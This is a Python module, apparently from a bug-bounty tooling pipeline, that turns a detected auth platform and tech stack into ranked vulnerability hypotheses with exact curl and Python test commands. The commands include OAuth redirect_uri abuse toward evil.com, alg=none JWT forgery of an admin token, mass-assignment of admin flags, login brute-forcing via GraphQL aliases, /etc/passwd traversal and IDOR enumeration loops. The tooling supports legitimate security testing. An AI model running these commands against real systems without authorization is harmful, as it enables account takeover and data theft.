"""
Phase 2.5 → 3 bridge: Bug Hypothesis Engine.

Given a SurfaceRecord (tech stack, auth platform, endpoints, flags),
produces a ranked list of specific, testable bug hypotheses with exact
commands. This is "automate breadth, manualize depth" — tell the hunter
exactly what to test and why, ranked by probability × impact for the
detected stack.

Hypothesis confidence: H (>60%), M (30-60%), L (<30%).
Hypothesis impact:     CRITICAL / HIGH / MEDIUM.

Only hypotheses with H×HIGH or H×CRITICAL, or M×CRITICAL go to Phase 3.
"""
from __future__ import annotations
import re
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class Hypothesis:
    id: str
    title: str
    vuln_class: str               # maps to qualifier.py _HIGH_VALUE_CLASSES
    confidence: str               # H / M / L
    impact: str                   # CRITICAL / HIGH / MEDIUM
    rationale: str                # one-line "why this target, why now"
    test_commands: list[str]      # exact commands to run on Pi
    manual_required: bool = False # needs browser / credentials
    chain_link: str = ""          # what this unlocks if confirmed
    estimated_cvss: str = ""


@dataclass
class HypothesisReport:
    host: str
    tech: list[str]
    auth_platform: str
    hypotheses: list[Hypothesis] = field(default_factory=list)

    def pursue(self) -> list[Hypothesis]:
        """Return hypotheses worth pursuing (H×HIGH+, M×CRITICAL)."""
        results = []
        for h in self.hypotheses:
            if h.confidence == "H" and h.impact in ("CRITICAL", "HIGH"):
                results.append(h)
            elif h.confidence == "M" and h.impact == "CRITICAL":
                results.append(h)
        return results

    def render_markdown(self) -> str:
        lines = [
            f"## Hypothesis Report: {self.host}",
            f"- Tech: {', '.join(self.tech) or 'unknown'}",
            f"- Auth: {self.auth_platform or 'unknown'}",
            "",
            "### Pursue-worthy hypotheses:",
        ]
        pursue = self.pursue()
        if not pursue:
            lines.append("  None meeting threshold — all H×HIGH+.")
        for i, h in enumerate(pursue, 1):
            lines.append(f"\n**[{i}] [{h.confidence}×{h.impact}] {h.title}**")
            lines.append(f"  Class: `{h.vuln_class}` | CVSS: {h.estimated_cvss}")
            lines.append(f"  Why: {h.rationale}")
            if h.chain_link:
                lines.append(f"  Chain: {h.chain_link}")
            lines.append("  Commands:")
            for cmd in h.test_commands:
                lines.append(f"    ```\n    {cmd}\n    ```")
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# Auth platform → hypothesis generators
# ─────────────────────────────────────────────────────────────────────────────

def _hypotheses_auth0(host: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:auth0:password-reset-enum",
            title="Auth0 password reset email enumeration",
            vuln_class="IDOR",
            confidence="H",
            impact="MEDIUM",
            rationale="Auth0 /dbconnections/change_password often returns different responses for registered vs unregistered emails, enabling user enumeration",
            test_commands=[
                f'curl -sk -X POST "https://{host}/dbconnections/change_password" '
                f'-H "Content-Type: application/json" '
                f'-d \'{{"client_id":"","email":"known@test.com","connection":"Username-Password-Authentication"}}\' '
                f'-w "\\nHTTP %{{http_code}}"',
                f'# Compare response for unknown email:',
                f'curl -sk -X POST "https://{host}/dbconnections/change_password" '
                f'-H "Content-Type: application/json" '
                f'-d \'{{"client_id":"","email":"notexistent99999@example.com","connection":"Username-Password-Authentication"}}\' '
                f'-w "\\nHTTP %{{http_code}}"',
            ],
            chain_link="User enumeration → credential brute-force if no lockout (standalone Low, but confirms user list for password spray)",
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:auth0:client-id-reuse",
            title="Auth0 OAuth redirect_uri bypass via misconfigured client",
            vuln_class="oauth-hijack",
            confidence="M",
            impact="CRITICAL",
            rationale="Auth0 clients with wildcard or overly permissive redirect_uri allowlists can be abused to steal tokens",
            test_commands=[
                f'# First: capture client_id from browser Network tab during login',
                f'# Then test redirect_uri bypass:',
                f'CLIENT_ID="<from browser>" && echo "https://{host}/authorize?response_type=token&client_id=$CLIENT_ID&redirect_uri=https://evil.com&scope=openid%20profile"',
            ],
            manual_required=True,
            chain_link="OAuth token hijack → account takeover (Critical)",
            estimated_cvss="AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
        ),
        Hypothesis(
            id=f"{host}:auth0:oidc-dynamic-reg",
            title="Auth0 OIDC dynamic client registration",
            vuln_class="oauth-hijack",
            confidence="L",
            impact="HIGH",
            rationale="Some Auth0 tenants expose /oidc/register for dynamic client registration; an attacker can register a client with arbitrary redirect_uri",
            test_commands=[
                f'curl -sk -X POST "https://{host}/oidc/register" '
                f'-H "Content-Type: application/json" '
                f'-d \'{{"redirect_uris":["https://evil.com"],"token_endpoint_auth_method":"none"}}\' '
                f'-w "\\nHTTP %{{http_code}}"',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
        ),
    ]


def _hypotheses_cognito(host: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:cognito:user-pool-enum",
            title="Cognito user pool user enumeration via InitiateAuth",
            vuln_class="IDOR",
            confidence="H",
            impact="MEDIUM",
            rationale="Cognito InitiateAuth returns UserNotFoundException for unknown users vs different errors for known users",
            test_commands=[
                f'curl -sk -X POST "https://cognito-idp.us-east-1.amazonaws.com/" '
                f'-H "X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth" '
                f'-H "Content-Type: application/x-amz-json-1.1" '
                f'-d \'{{"AuthFlow":"USER_PASSWORD_AUTH","AuthParameters":{{"USERNAME":"notexist99@example.com","PASSWORD":"WrongPass123"}},"ClientId":"<pool_client_id>"}}\' '
                f'-w "\\nHTTP %{{http_code}}"',
                f'# Compare error: UserNotFoundException vs NotAuthorizedException = user exists',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:cognito:identity-pool-unauth",
            title="Cognito Identity Pool unauthenticated access",
            vuln_class="credential-exposure",
            confidence="M",
            impact="HIGH",
            rationale="Cognito Identity Pools with AllowUnauthenticatedIdentities=true can be exploited to get temporary AWS credentials",
            test_commands=[
                f'# Find identity pool ID from JS bundle (search for "us-east-1:" pattern)',
                f'grep -r "IdentityPoolId" results/ 2>/dev/null | head -5',
                f'# If found: get unauthenticated credentials',
                f'curl -sk -X POST "https://cognito-identity.us-east-1.amazonaws.com/" '
                f'-H "X-Amz-Target: AWSCognitoIdentityService.GetId" '
                f'-H "Content-Type: application/x-amz-json-1.1" '
                f'-d \'{{"IdentityPoolId":"us-east-1:XXXXXX","AccountId":"<aws_account_id>"}}\' ',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        ),
    ]


def _hypotheses_pingfederate(host: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:pf:token-introspect",
            title="PingFederate token introspection endpoint unauthenticated",
            vuln_class="credential-exposure",
            confidence="M",
            impact="HIGH",
            rationale="PingFederate /as/introspect may allow unauthenticated token introspection, exposing token metadata",
            test_commands=[
                f'curl -sk -X POST "https://{host}/as/introspect.oauth2" '
                f'-d "token=eyJhbGciOiJSUzI1NiJ9.test" '
                f'-w "\\nHTTP %{{http_code}}"',
                f'curl -sk "https://{host}/.well-known/openid-configuration" | python3 -m json.tool | grep -E "introspect|registration"',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:pf:oidc-dynamic-reg",
            title="PingFederate OIDC dynamic client registration (unauthenticated)",
            vuln_class="oauth-hijack",
            confidence="M",
            impact="CRITICAL",
            rationale="PingFederate sometimes enables /as/clientregistration.oauth2 without requiring a registration access token",
            test_commands=[
                f'curl -sk -X POST "https://{host}/as/clientregistration.oauth2" '
                f'-H "Content-Type: application/json" '
                f'-d \'{{"redirect_uris":["https://evil.com"],"client_name":"testclient","grant_types":["authorization_code"]}}\' '
                f'-w "\\nHTTP %{{http_code}}"',
                f'curl -sk "https://{host}/.well-known/openid-configuration" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\'registration_endpoint\',\'NONE\'))"',
            ],
            chain_link="Arbitrary redirect_uri → steal auth code → account takeover (Critical)",
            estimated_cvss="AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
        ),
    ]


def _hypotheses_graphql(host: str) -> list[Hypothesis]:
    # Build graphql payloads as plain strings to avoid f-string brace escaping complexity
    gql_intro = r'{"query":"{ __schema { types { name fields { name } } } }"}'
    gql_types = r'{"query":"{ __schema { types { name } } }"}'
    gql_idor  = r'{"query":"{ user(id: \"OTHER_USER_ID\") { id email orgId } }"}'
    return [
        Hypothesis(
            id=f"{host}:graphql:introspection-unauth",
            title="GraphQL introspection unauthenticated — schema leakage",
            vuln_class="IDOR",
            confidence="H",
            impact="MEDIUM",
            rationale="Unauthenticated introspection reveals schema (types, mutations, queries) that maps the entire API attack surface",
            test_commands=[
                f"curl -sk -X POST 'https://{host}/graphql' -H 'Content-Type: application/json' -d '{gql_intro}' | python3 -m json.tool 2>/dev/null | head -50",
                f"curl -sk -X POST 'https://{host}/api/graphql' -H 'Content-Type: application/json' -d '{gql_types}' -w '\\nHTTP %{{http_code}}'",
            ],
            chain_link="Schema → find ID-based queries → test IDOR on each query type (IDOR High)",
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:graphql:idor",
            title="GraphQL object-level authorization bypass (IDOR/BOLA)",
            vuln_class="IDOR",
            confidence="M",
            impact="CRITICAL",
            rationale="GraphQL resolvers often lack field-level authz checks; querying another user's ID in a resolver may return their data",
            test_commands=[
                "# After introspection, identify User/Account/Organization types",
                "# Test: query with IDs belonging to other accounts",
                f"curl -sk -X POST 'https://{host}/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <your_token>' -d '{gql_idor}'",
            ],
            manual_required=True,
            chain_link="Cross-tenant data read → CVSS 9.3 (Critical) for multi-tenant SaaS",
            estimated_cvss="AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:graphql:batch-alias",
            title="GraphQL batch query / alias abuse for rate-limit bypass",
            vuln_class="IDOR",
            confidence="L",
            impact="HIGH",
            rationale="GraphQL allows aliased parallel queries; batch 100 login attempts in one HTTP request to bypass IP rate limiting",
            test_commands=[
                f'# Only if login mutation found in schema:',
                f'python3 -c "',
                f'aliases = [f\'a{{i}}: login(email:\\"test{{i}}@x.com\\",password:\\"pass{{i}}\\")',
                f'{{token userId}}\\\" for i in range(100)]',
                f'print(\\"{{\\" + \\",\\\\n\\\".join(aliases) + \\"}}\\\")"',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        ),
    ]


def _hypotheses_rails(host: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:rails:mass-assignment",
            title="Rails mass assignment via JSON API body",
            vuln_class="IDOR",
            confidence="M",
            impact="HIGH",
            rationale="Rails APIs without strong params allow setting role/admin/is_owner fields via POST/PATCH body",
            test_commands=[
                f'# On any POST /api/v1/users or PATCH /api/v1/profile:',
                f'curl -sk -X PATCH "https://{host}/api/v1/profile" '
                f'-H "Content-Type: application/json" '
                f'-H "Cookie: <your_session>" '
                f'-d \'{{"user":{{"is_admin":true,"role":"admin","verified":true}}}}\'  '
                f'-w "\\nHTTP %{{http_code}}"',
            ],
            manual_required=True,
            estimated_cvss="AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        ),
        Hypothesis(
            id=f"{host}:rails:debug-endpoints",
            title="Rails /rails/info/properties exposed",
            vuln_class="credential-exposure",
            confidence="M",
            impact="MEDIUM",
            rationale="/rails/info/properties and /rails/info/routes expose app config and route table in non-production environments",
            test_commands=[
                f'curl -sk -w "\\nHTTP %{{http_code}}" "https://{host}/rails/info/properties"',
                f'curl -sk -w "\\nHTTP %{{http_code}}" "https://{host}/rails/info/routes"',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        ),
    ]


def _hypotheses_jwt(host: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:jwt:alg-none",
            title='JWT algorithm confusion — "alg":"none" bypass',
            vuln_class="JWT-attack",
            confidence="M",
            impact="CRITICAL",
            rationale='Some JWT libraries accept tokens with alg=none (no signature), allowing arbitrary claims. Test before spending time on RS256->HS256.',
            test_commands=[
                f'# Build alg=none token with your real sub/user_id:',
                f'python3 -c "',
                f'import base64, json',
                f'h = base64.b64encode(json.dumps({{"alg":"none","typ":"JWT"}}).encode()).rstrip(b"=").decode()',
                f'p = base64.b64encode(json.dumps({{"sub":"1","email":"attacker@test.com","role":"admin","iat":9999999999}}).encode()).rstrip(b"=").decode()',
                f'print(f\'{{h}}.{{p}}.\')"',
                f'# Send to API:',
                f'curl -sk "https://{host}/api/me" -H "Authorization: Bearer <alg-none-token>" -w "\\nHTTP %{{http_code}}"',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
        ),
        Hypothesis(
            id=f"{host}:jwt:rs256-hs256",
            title="JWT RS256 to HS256 confusion attack",
            vuln_class="JWT-attack",
            confidence="L",
            impact="CRITICAL",
            rationale="If backend verifies HS256 tokens using the public key as HMAC secret, signing with the public key creates a valid admin token",
            test_commands=[
                f'# Step 1: Fetch server public key',
                f'curl -sk "https://{host}/.well-known/jwks.json" | python3 -m json.tool | head -30',
                f'# Step 2: Use jwt_tool for confusion attack if JWK found',
                f'# python3 jwt_tool.py <your_jwt> -X k -pk server_pubkey.pem',
            ],
            manual_required=True,
            estimated_cvss="AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
        ),
    ]


def _hypotheses_open_api(host: str, path: str) -> list[Hypothesis]:
    """Hypotheses for a known open (unauthenticated) API endpoint."""
    return [
        Hypothesis(
            id=f"{host}:open-api:idor:{path.replace('/', '_')}",
            title=f"IDOR on open API endpoint {path}",
            vuln_class="IDOR",
            confidence="H",
            impact="HIGH",
            rationale=f"{host}{path} returns 200 without auth. Test: substitute integer IDs, GUIDs, org names to access other users' data.",
            test_commands=[
                f'curl -sk "https://{host}{path}" -w "\\nHTTP %{{http_code}}"',
                f'# If response contains user/org IDs, fuzz them:',
                f'for ID in 1 2 3 100 999 $(uuidgen); do',
                f'  CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{host}{path}/$ID")',
                f'  echo "$ID → HTTP $CODE"',
                f'done',
            ],
            chain_link="Unauthenticated data access → direct IDOR High/Critical report",
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:open-api:cors:{path.replace('/', '_')}",
            title=f"CORS misconfiguration on sensitive API {path}",
            vuln_class="CORS-sensitive-data",
            confidence="M",
            impact="HIGH",
            rationale=(
                f"{path} returns data. If CORS allows arbitrary origins AND the data is user-specific, "
                f"it enables cross-site data exfiltration — this DOES qualify as High (unlike typical CORS findings)."
            ),
            test_commands=[
                f'RESP=$(curl -sk "https://{host}{path}" -H "Origin: https://evil.com" -I)',
                f'echo "$RESP" | grep -i "access-control"',
                f'# If Access-Control-Allow-Origin: https://evil.com (or: *) AND response has user data → report',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N",
        ),
    ]


def _hypotheses_admin_panel(host: str, panel: dict) -> list[Hypothesis]:
    panel_name = panel.get("name", "")
    path = panel.get("path", "")
    code = panel.get("code", 0)

    if code == 200:
        return [Hypothesis(
            id=f"{host}:admin:{panel_name}",
            title=f"Unauthenticated {panel_name} admin panel at {path}",
            vuln_class="default-creds",
            confidence="H",
            impact="CRITICAL",
            rationale=f"{panel_name} at {host}{path} returns HTTP 200 — it's accessible without authentication. This is a Critical finding.",
            test_commands=[
                f'curl -sk "https://{host}{path}" | head -c 2000',
                f'# Document what data/controls are accessible',
                f'# Screenshot for PoC evidence',
            ],
            chain_link="Unauthenticated admin access → RCE/data exfil depending on panel type",
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        )]
    return []


def _hypotheses_swagger(host: str) -> list[Hypothesis]:
    """Swagger/OpenAPI — API surface map for further IDOR/auth testing."""
    return [
        Hypothesis(
            id=f"{host}:swagger:exposed",
            title="OpenAPI spec exposed — full API surface disclosed",
            vuln_class="credential-exposure",
            confidence="H",
            impact="MEDIUM",
            rationale="Exposed Swagger UI/OpenAPI spec reveals all API endpoints, params, auth schemes. High-value starting point for IDOR/auth bypass.",
            test_commands=[
                f'for _P in "/swagger-ui.html" "/swagger" "/api-docs" "/openapi.json" "/openapi.yaml"; do',
                f'  CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{host}$_P")',
                f'  [[ "$CODE" == "200" ]] && echo "FOUND: https://{host}$_P"',
                f'done',
                f'# Download spec:',
                f'curl -sk "https://{host}/openapi.json" | python3 -m json.tool | grep -E "path|operationId" | head -40',
            ],
            chain_link="API spec → enumerate all endpoints → test each for IDOR",
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        ),
    ]


def _hypotheses_self_registration(host: str, path: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:self-reg:idor",
            title=f"Self-registration open → IDOR after account creation",
            vuln_class="IDOR",
            confidence="H",
            impact="CRITICAL",
            rationale=(
                f"Self-registration at {host}{path} allows creating an account on what should be an "
                f"invite-only enterprise platform. After registration: enumerate other tenants, "
                f"test cross-tenant data access."
            ),
            test_commands=[
                f'# 1. Register test account (do in browser):',
                f'# open https://{host}{path}',
                f'# 2. After login, capture session and run:',
                f'SESSION="<your_session_cookie>"',
                f'for _EP in /api/users /api/organizations /api/tenants /api/accounts /api/admin; do',
                f'  CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" -b "$SESSION" "https://{host}$_EP")',
                f'  echo "$_EP → HTTP $CODE"',
                f'done',
                f'# 3. Test IDOR: change org/user IDs in responses:',
                f'curl -sk -b "$SESSION" "https://{host}/api/organizations/1" -w "\\nHTTP %{{http_code}}"',
                f'curl -sk -b "$SESSION" "https://{host}/api/organizations/2" -w "\\nHTTP %{{http_code}}"',
            ],
            manual_required=True,
            chain_link="Self-reg + IDOR → cross-tenant data access = Critical (CVSS 9.1)",
            estimated_cvss="AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
        ),
    ]


# ─────────────────────────────────────────────────────────────────────────────
# Generic hypotheses for any unrecognized stack
# ─────────────────────────────────────────────────────────────────────────────

def _hypotheses_generic(host: str) -> list[Hypothesis]:
    return [
        Hypothesis(
            id=f"{host}:generic:path-traversal",
            title="Path traversal / LFI on file-serving parameters",
            vuln_class="path-traversal",
            confidence="L",
            impact="HIGH",
            rationale="Generic — test common LFI patterns on any file/resource parameters found",
            test_commands=[
                f'for _PATH in "/../../../etc/passwd" "/%2e%2e/%2e%2e/etc/passwd" "/..%2F..%2F..%2Fetc%2Fpasswd"; do',
                f'  CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{host}$_PATH")',
                f'  echo "$_PATH → HTTP $CODE"',
                f'done',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        ),
        Hypothesis(
            id=f"{host}:generic:http-methods",
            title="Unexpected HTTP methods enabled (PUT/DELETE/TRACE/CONNECT)",
            vuln_class="IDOR",
            confidence="L",
            impact="MEDIUM",
            rationale="APIs that accept PUT/DELETE without proper authz enable unauthorized modifications",
            test_commands=[
                f'for _M in PUT DELETE TRACE OPTIONS PATCH; do',
                f'  CODE=$(curl -sk -X $_M -o /dev/null -w "%{{http_code}}" "https://{host}/api/v1/users/1")',
                f'  echo "$_M /api/v1/users/1 → HTTP $CODE"',
                f'done',
            ],
            estimated_cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        ),
    ]


# ─────────────────────────────────────────────────────────────────────────────
# Main entry point
# ─────────────────────────────────────────────────────────────────────────────

def generate(surface_record) -> HypothesisReport:
    """
    Generate ranked bug hypotheses from a SurfaceRecord.

    surface_record: SurfaceRecord from surface_map.py
    Returns: HypothesisReport with .pursue() for top-priority tests.
    """
    host = surface_record.host
    tech = getattr(surface_record, "tech", []) or []
    auth_platform = getattr(surface_record, "auth_platform", "") or ""
    open_apis = getattr(surface_record, "open_api_endpoints", []) or []
    admin_panels = getattr(surface_record, "admin_panels", []) or []
    self_reg = getattr(surface_record, "self_registration", False)
    self_reg_path = getattr(surface_record, "self_registration_path", "") or "/register"
    flags = getattr(surface_record, "flags", []) or []

    report = HypothesisReport(host=host, tech=tech, auth_platform=auth_platform)
    hyps: list[Hypothesis] = []

    # 1. Auth platform specific
    if auth_platform == "auth0":
        hyps.extend(_hypotheses_auth0(host))
    elif auth_platform == "cognito":
        hyps.extend(_hypotheses_cognito(host))
    elif auth_platform == "pingfederate":
        hyps.extend(_hypotheses_pingfederate(host))

    # 2. GraphQL detected
    graphql_flag = any("graphql" in f.lower() for f in flags)
    graphql_panel = any(p.get("name") == "graphql" for p in admin_panels)
    if graphql_flag or graphql_panel or "/graphql" in open_apis or "/api/graphql" in open_apis:
        hyps.extend(_hypotheses_graphql(host))

    # 3. Tech stack
    tech_lower = [t.lower() for t in tech]
    if "rails" in tech_lower:
        hyps.extend(_hypotheses_rails(host))
    if any("jwt" in t for t in tech_lower) or auth_platform in ("auth0", "cognito", "pingfederate", "okta"):
        hyps.extend(_hypotheses_jwt(host))

    # 4. Open API endpoints
    for path in open_apis:
        hyps.extend(_hypotheses_open_api(host, path))

    # 5. Admin panels
    for panel in admin_panels:
        hyps.extend(_hypotheses_admin_panel(host, panel))
        if panel.get("name") == "swagger" and panel.get("code") == 200:
            hyps.extend(_hypotheses_swagger(host))

    # 6. Self-registration
    if self_reg:
        hyps.extend(_hypotheses_self_registration(host, self_reg_path))

    # 7. Generic (always — only L confidence so don't flood but keep as fallback)
    hyps.extend(_hypotheses_generic(host))

    # Deduplicate by id
    seen: set[str] = set()
    unique: list[Hypothesis] = []
    for h in hyps:
        if h.id not in seen:
            seen.add(h.id)
            unique.append(h)

    # Sort: CRITICAL before HIGH before MEDIUM, H before M before L
    _impact_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
    _conf_order   = {"H": 0, "M": 1, "L": 2}
    unique.sort(key=lambda h: (
        _impact_order.get(h.impact, 9),
        _conf_order.get(h.confidence, 9),
    ))

    report.hypotheses = unique
    return report


def generate_from_dict(d: dict) -> HypothesisReport:
    """Convenience wrapper: generate from a plain dict (loaded from JSONL)."""
    from dataclasses import make_dataclass
    # Create a minimal object with the needed attributes
    class _Rec:
        pass
    rec = _Rec()
    for k, v in d.items():
        setattr(rec, k, v)
    return generate(rec)
